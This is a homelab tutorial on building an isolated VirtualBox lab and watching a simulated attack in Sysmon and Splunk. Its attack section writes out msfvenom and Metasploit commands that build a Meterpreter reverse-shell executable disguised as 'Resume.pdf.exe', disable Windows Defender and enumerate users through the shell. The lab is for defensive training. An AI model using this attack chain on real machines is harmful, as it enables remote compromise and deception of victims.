# Secure Virtualization Environment with Incident Analysis

## Objective
The objective of this project is to create a secure sandboxed environment using VirtualBox, leveraging tools like Splunk, Sysmon, and Metasploit (Msfvenom) for monitoring, analysing, and responding to security incidents. The project also aims to simulate attacks and analyse their impact within the isolated environment to enhance cybersecurity awareness and incident response skills.

## Skills Learned
- Virtualisation: Setup, manage VMs, create snapshots, configure networking securely.
- Big Data Analysis: Use Splunk for collecting, indexing, and analyzing Sysmon logs.
- System Monitoring: Deploy Sysmon for detailed system activity logging on Windows.
- Penetration Testing: Generate payloads with Msfvenom, simulate attacks with Metasploit.
- Network Security: Configure secure network settings in VirtualBox, perform network scans (NMAP).
- Incident Response: Analyze malware behavior, establish reverse shells, use Splunk for event correlation.
- Documentation: Create detailed guides for setup, tool installation, and incident response procedures.

## Tools Used
- Windows 10 (for VM)
- Kali Linux (for VM)
- VirtualBox: Virtualization software to create and manage virtual machines
- Splunk: A big data platform that collects and manages massive volumes of data and searching for information within it
- Sysmon: A windows system service and device driver that monitors and logs system activity to the Windows event log even through reboots
- Msfvenom: a Metasploit standalone payload generator and management tool
- NMAP: Network exploration tool and security scanner used to discover hosts and services on a computer network, thus creating a map of the network.
- Python: Used for setting up an HTTP server, facilitating the download of files and tools between virtual machines and the host.
- PowerShell: Command-line shell and scripting language used to automate tasks and configure systems, particularly for installing and configuring Sysmon.
- Event Viewer: Windows tool used for viewing and analyzing logs generated by applications and system components, including Sysmon logs.
- Command Prompt: Windows command-line interpreter used for executing commands and scripts, checking network connectivity, and managing system resources.

## Things to note

1. Sandbox Enviorments
    - Just by creating a virtual machine, doesn't mean you're in a sandbox enviornment
2. Create Snapshots
    - This is basically a backup, of a point in time. This can be used to restore the system if anything goes wrong. Always create a Snapshot before you test anyting on your system
    - To create a Snapshot:
        - Go to VirtualBox
        - Select the VM you want to create a snapshot for and click on the "Bullets" menu 
        - Click on Snapshots
        - Click on "Take" to create a new snapshot and set a name for your snapshot
    - To restore a Snapshot:
        - Select the Snapshot you require to rollback to and click on "Restore"
3. Specifications
    - Make sure not to over spec the Virtual Machine if your PC doesn't have the sufficient resources (RAM, CPU etc.)



# Guide
## Installing the Hypervisor and creating the Windows 10 ISO
We are going to be using VirtualBox as our Hypervisor.

1. Go to [VirtualBox](https://www.virtualbox.org/wiki/Downloads) downloads page, and select the download package for your current operating system. 
    > In this tutorial, we will be downloading the package for "Windows hosts"

2. Compare the [checksums](https://www.virtualbox.org/download/hashes/7.0.18/SHA256SUMS) of the file which will verify the integrity of the downloaded packagae to ensure that the file hasn't been tampered with.
    - When you go into the above checksums link, it will provide you with a list of SHA256 hashes
    - Go into the directory where your Windows VirtualBox file has been downloaded to
    - Right-Click anywhere in the folder and select "Open in Terminal"
        > may have to select 'Show more options'
    -  In the Terminal, type in "Get-FileHash Virtual" and hit the **TAB** button. This will autocomplete the file name. Hit **ENTER** and you should be able to see the Hash
    ![Screenshot of terminal window showing the output of the above step](/img/WindowsTerminal.png)
    - Compare the hash you got from the terminal with the hash provided in the VirtualBox website.
    - If they match, you can proceed with the installation
3. Install VirtualBox by following the installation wizard. Accept the default settings
4. There are many places from which you could download a Windows 10 ISO file however, in this guide, we're going to be creating our own Windows 10 ISO file
5. Go to the download page for [Windows 10](https://www.microsoft.com/en-ca/software-download/windows10) and click on the **Download tool now** under the header **Create Windows 10 installation media**
6. Once downloaded, run the tool and **Accept** the notices and license terms
7. On the next window, Select **Create installation media**
![Screenshot of windows 10 installtion media tool giving the option to select to Upgrade PC or Create installation media](/img/Windows10tool.png)
8. You can customise the options given or **tick the box** to use the recommended options. We're going to use the recommended options
![Screenshot of windows 10 installtion media tool giving the option to select to Customise options or use recommended settings](/img/Windows10tool2.png)
9. Select the **ISO file** option on the next window
![Screenshot of windows 10 installtion media tool giving the option to select to USB Flash drive or ISO file](/img/Windows10tool2.png)
10. Follow the next steps and wait until the ISO is created

## Setting up Windows 10 in VirtualBox

1. In the VirtualBox main window, click on **New**
2. Type a name for your Virtual Machine and Select the location of the above windows 10 ISO file
    > If you want to install windows 10 manually, untick the **Skip Unattended Installation** box
    > we're going to tick the box for this guide
3. On the next windows, set the Base Memory to 4GB and 1 CPU processor
    > You can adjust these settings based on your system's capabilities
4. Leave the **Virtual Hard Disk** settings as is
5. Shows the summary of options selected - hit Finish
6. Power on the VM by clicking on the **Start** button
7. Once the VM has loaded up, it will display the Windows 1o setup window
8. Change options as needed or leave as default and hit Next - then Install Now
9. On the **Activate Windows** screen, select 'I don't have a product key'
10. Select Windows 10 Pro and hit Next
11. Accept the license terms and hit Next
12. Select 'Custom: Install Windows only (advanced)'
13. In the 'Where do you want to install Windows' - you can create your own partition or leave as is - hit Next
14. Installation Windows 10 will begin
15. Once installation is complete, you are ready to use your Windows 10 VM in VirtualBox

## Setting up Kali Linux in VirtualBox
> Please note that the default credentials to log into Kali Linux is **"kali/kali"**

1. Go to the [Kali Linux](https://www.kali.org/) and hit Donwload
2. We have 2 options for downloading Kali
    - Installer Images (similar to the ISO file for Windows 10)
    - Pre-built images (Virutal Machine)
    > For this tutorial, we will be downloading the pre-built image and importing into VirtualBox
3. Click on the **Virtual Machines** option
4. Select 64-bit (or 32-bit if your PC doesn't support 64-bit) and click on the **VirutalBox** option
    - You can check whether your pc is 32-bit or 64-bit by doing the following
        - Click on the 'Start' button on your taskbar
        - Search for 'System Information'
        - Under 'System Type' is where you will find whether your pc is 32-bit (x86) or 64-bit (x64)
        ![Screenshot of system information in windows 10 that shows whether your pc is a 32-bit or 64-bit machine](/img/systeminfo.png)
5. Once the download has completed, go ahead and extract the contents of the .7z file to where you prefer
6. Go into the folder where you extracted Kali, and then double click on the ".vbox" file
    > Blue icon
7. In the VirtualBox window, you will see the Kali Linux OS imported

## Properly configuring the Virtual Machine
> This is important for both Windows 10 and Kali Linux VMs
> This is to ensure that whatever it is you're doing on your VM, doesn't spill over the your Host system

1. In the VirtualBox windows, Select your VM (Windows or Kali) and then click on "Settings"
2. Select "Network" on the left side-pane
> If you want to test tools and have access to the internet, you can leave the default setting of **"NAT"**

> If you want to test Malware, you can select **"Internal Netwrok"** which will have the virtual machines in their own network which no access to the Host System or the Internet

> Since we're going to be analysing Malware, we will change the Network
3. In the "Adapter 1" tab, click on the "Attached to:" drop down box and select **"Internal Network"** and set a name for it
> Do this for the other VM's you want part of the same network
4. Now we need to assign a static IP address for both the Windows and Kali Linux machones
    - For Windows:
        - On your taskbar, right-click on the 'globe' icon and select "Open Network & Internet Settings"
        - Scroll down and clock on 'Change adapter options'
        - Right-click on "Ethernet" and select "Properties"
        - Select "Internet Protocol Version 4" abd click on "Properties"
        - Click on "Use the following IP address"
        - Set the IP address to something like **"192.168.20.10"** and hit "Ok"
            - To check the IP address - open up command prompt and type in "ipconfig"
    - For Kali Linux:
        - right-click on the "Ethernet" icon at the top right corner
        - Select "Edit Connections"
        - Select "Wired connection 1" and click on the "gear" icon at the bottom left of the window
        - Select IPv4 Settings
        - Click on "Method" and select "Manual"
        - Click on "Add" and set the IP address to something like **"192.168.20.11"** and Netmask as **"24"**
        - Hit Save
            - to check the IP address - right click anywhere on the screen and select "Open Terminal Here"
            - type in "ip addr show" or "ifconfig" and hit enter
5. Now we check if we have connectivity between our 2 machines (windows & Kali Linux)
    - To ping the Windows machine on Kali Linux:
        - ping 192.168.20.10
        > This wont work because the Windows Firewall is blocking inbound ICMP traffic
    - To ping the Kali Linux machine on Windows:
        - ping 192.168.20.11
        > This works!

## Using Splunk to view Event Logs (Windows 10)

1. Download and install [Splunk - Enterprise Edition](https://www.splunk.com/en_us/download.html)
2. Once installed, open Splunk and click on "Add Data"
3. Under "Local Event Logs", Select "Application, Security & System" and hit Next
4. In "Input Settings", leave everything as default
5. Click on "Review" and then "Submit"
6. Click on "Start Searching"
7. Choose an "Event Code' you want to search for and type it in the "Search" bar
![Screenshot of splunk search for EventCode 4672](/img/SplunkSearch.png)

## Using Sysmon (Windows 10)

1. Download and install [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Open Windows Powershell as Administrator
3. Ensure that your Powershell directory is set to the same location as the Sysmon folder
    - You can change the directory by typing **cd C:\Users\Test\Downloads\Sysmon**
4. Ensure that if you have a config file, it is in the same folder as Sysmon
5. Type in Sysmon64 and hit **TAB** to auto-complete and add to the line -i sysmonconfig.xml
    > Should look like this: .\Sysmon64.exe -i sysmonconfig.xml

    > -i = Install service and drive. Optionally take a configuration file
6. A window will pop-up asking to agree to terms - hit Agree. **This will then install Sysmon**
7. To view the logs, open Event Viewer
    - Navigate to "Applications and Services Logs" > "Microsoft" > "Windows" > "Sysmon" > "Operational"

## Using NMAP (Kali Linux)

1. First we will grab the IP address of the Kali machine
    > Terminal > ifconfig
2. Type in "nmap -A 192.168.20.10 -Pn" - Where the IP address is the Windows machine we're targetting > hit Enter
    > nmap -h : will show us all the available options of nmap that's available

    > -A : Enable OS detection, version detection, script scanning, and traceroute

    > -Pn : Treat all hosts as online -- skip host discovery
3. Once the scan is done - It will display any open ports. In our case it will be **Port 3389**
    > This was achieved by enabling Remote Desktop Protocol (RDP) under Start > Settings > System > Remote Desktop, and turn on Enable Remote Desktop

## Using Msfvenom (Kali Linux)
1. Now we will create our basic Malware using **Msfvenom**
2. Type in "msfvenom" in the terminal window - this will output a list of options available to us
3. To get a list of payloads - we can type in "msfvenom -l payloads"
4. For this exercise we will be using the following payload
    - windows/x64/meterpreter_reverse_tcp ()
5. To create our malware, type in the following command:
    - msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe
    > lhost = IP address of the Kali machine

    > lport = Port number we want to use for the reverse connection

    > -f exe = Output format as an executable file

    > -o Resume.pdf.exe = Output file name
6. After the command has run, we should see the "Resume.pdf.exe" file on our desktop
7. Now we will open up our handler (Metasploit) that will listen in on the port that we have configured in our malware:
    - Terminal > msfconsole
8. In the MetaSploit console, we will type the following to use the handler:
    - use exploit/multi/handler
9. In the handler, if we type "options" - we can see that the payload options is called **generic/shell_reverse_tcp**
    > We will change the above to match the same payload that we used when we were configuring our malware in Msfvenom
10. Type in **set payload windows/x64/meterpreter/reverse_tcp**
    > now if we type "options" we can see the name change in the payload
11. Now we need to update our **"LHOST"**
12. To do this we type in the following command:
    - set lhost 192.168.20.11 (this is the Kali linux machine)
13. Now we type the following command to start the exploit:
    - exploit
14. Our next step is to setup a HTTP server on our Kali machine so our test machine can download the malware. We will do this using **Python**
15. In a new Terminal window/tab, type in the following command:
    - python3 -m http.server 9999
16. Now we move over to our **Windows 10 Machine** and do the following:
    - Disable Windows Defender
    - Use a web browser to download and execute our malware

### Windows 10
17. Start > Search > Windows Security > Virus & threat protection > Manage settings> Turn off Real-time protection
18. Open a web browser and navigate to **http://192.168.20.11:9999** and we will see our **Resume.pdf.exe** file
19. Download and execute the file
20. Now we will open up Command Prompt with Administrator privileges
21. Type in "netstat -anob" (Shows all in-use ports and the application which use them)
    > We want to see if an established connection to our Kali machine is there
22. Scroll up the terminal window and find the connection
![Screenshot of the terminal windows that displays the established connection with our kali machine](/img/WindowsTerminal2.png)
23. Now we go back to our **Kali Machine** and we should see that we have an open shell in our Handler

### Kali Linux
24. We can see the connection in our handler
![screenshot of the kali linux terminal window showing the established connection with our windows 10 machine](/img/KaliTerminal.png)
    > If you type in "help" - you will see all the available commands at our disposal
25. Type in "shell" to establish a shell on our Windows 10 machine
26. Type in "net user" to see a list of every user account on the Windows 10 machine
26. Type in "net localgroup" to see a list of all the local groups on the local server
26. Type in "ipconfig" to see a list of IPv4 and IPv6 addresses, subnet mask, and default gateway for all adapters.
27. Now we go back to our Windows 10 machine to see what sort of Telemetry it's generated using **Splunk**

### Windows 10
28. First we need to make sure **Splunk** is configured to ingest **Sysmon** logs
29. Go into the folder where Splunk is installed and see if you have an **"inputs.conf"** file
    > ### C:\Program Files\Splunk\etc\system\local

    > If not, we copy it from the **default** folder and place it in the **local** folder
30. Then we edit the **inputs.conf** file using Notepad to ensure that Splunk is configured properly
31. Then we will restart the Splunk Service
    > Search > Services > Splunkd Service > Restart
32. Next we need to create an Index called "Endpoint"
    > Splunk Web (127.0.0.1:8000) > Settings > Indexes > New Index > type in **endpoint**
33. Then at the top of the page we go to Apps > Search & Reporting then type in "index = endpoint"
34. Since the Sysmon data isn't parsed automatically, we can do so by downloading an app in Splunk
    > Apps > Find more apps > Search for "sysmon" > Download **Splunk Add-on for Sysmon** > Install
35. Then go back to Apps > Search & Reporting and search for our Kali Linux Machine
    > index=endpoint 192.168.20.11
36. Now if we check the **"dest_port"** - we can see that the machine with that IP address has been targetting port number 3389 (RDP) on our test machine (Windows 10)
37. Now we can check what our Malware looks like which was called "Resume.pdf.exe"
    > index=endpoint Resume.pdf.exe
38. In the EventCode section, we can see how many alerts were created
39. If we expand the first event, we can scroll down and see the following
    > **ParentImage:** Resume.pdf.exe

    > **process:** cmd.exe

    > **process_id:** 3648
    
    > **process_guid:** {db846932-b693-666f-4605-000000000a00}

    > **parent_process_id:** 6564

    > What the above is telling us is that Resume.pdf.exe had spawned command prompt which had the process_id of 3648
40. Now we can use the "process_id" or the "process_guid" to query our data to see what the command prompt had done, by using rhe "parent_process_id"
    > Search for: index=endpoint {db846932-b693-666f-4605-000000000a00}

    > We can clean it up more by selecting the events we want to see by: index=endpoint {db846932-b693-666f-4605-000000000a00} |table _time,ParentImage,Image,CommandLine
41. Now we can see what commands were run
![Screenshot of the search result of the process_guid](/img/SplunkSearch2.png)